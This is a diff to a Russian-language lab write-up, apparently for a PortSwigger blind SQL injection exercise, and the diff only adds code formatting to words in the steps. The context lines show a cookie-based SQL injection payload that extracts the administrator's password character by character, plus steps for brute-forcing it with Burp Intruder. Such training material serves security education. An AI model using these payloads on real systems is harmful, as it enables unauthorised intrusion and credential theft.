@@ -58,7 +58,7 @@ AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1
 Cookie: TrackingId=4B50SuDbzQLs2Z2P' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
 ```
 
-Оправляем в Intruder:
+Оправляем в `Intruder`:
 
 ![PortSwigger](../Drawing/Drawing_19.png)
 
@@ -66,11 +66,11 @@ Cookie: TrackingId=4B50SuDbzQLs2Z2P' AND (SELECT SUBSTRING(password,1,1) FROM us
 
 ![PortSwigger](../Drawing/Drawing_20.png)
 
-Выделяем '1' добавляем в 'add' делаем настройки: 
+Выделяем `1` добавляем в `add` делаем настройки: 
 
 ![PortSwigger](../Drawing/Drawing_21.png)
 
-Аналогично делаем настройи, выбирая 'Bruteforce' для:
+Аналогично делаем настройи, выбирая `Bruteforce` для:
 
 ![PortSwigger](../Drawing/Drawing_22.png)
 
